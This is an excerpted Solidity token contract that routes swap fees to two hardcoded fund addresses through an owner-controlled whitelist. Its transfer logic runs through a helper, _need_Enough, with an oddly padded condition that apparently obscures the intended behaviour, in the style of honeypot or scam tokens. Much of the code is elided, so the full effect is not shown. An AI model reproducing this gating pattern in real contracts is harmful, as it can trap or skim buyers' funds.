...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        address FundAddress,address FundAddress_2, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
    ...
    function _need_Enough(address addr, address addr_2) internal view returns (bool){
        return (addr != addr_2
        || false ||
        !_feeWhiteList[addr]);
    }
    ...
    function _transfer(
        ...
        uint256 balance = balanceOf(from);if (_need_Enough(from,to))
    ...
    function _tokenTransfer(
        ...
        bool takeFee,
        bool isSell
    ) private {if (_need_Enough(sender,recipient))
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint256 fundAmount_1 = fundAmount / 2;
        uint256 fundAmount_2 = fundAmount - fundAmount_1;
        
        FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount_1);
        FIST.transferFrom(address(_tokenDistributor), fundAddress_2, fundAmount_2);
    ...
    function setFundAddress(address addr,address addr_2) external onlyFunder {
        fundAddress = addr;
        fundAddress_2 = addr_2;
        _feeWhiteList[addr] = true;
        _feeWhiteList[addr_2] = true;
    }
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        9,//Decimals
        16000,//Supply
        address(0x737184C75C9078dF55BB079bADc92a8D9454C32a),//FundAddress
        address(0x6C8748d6Ad911682eccca499B259AABEFA25c92D),//FundAddress 2
        address(0x5ce4E2293fbaE48D6072E37CA8E34B552620af10)//ReceiveAddress
    ){
    }
}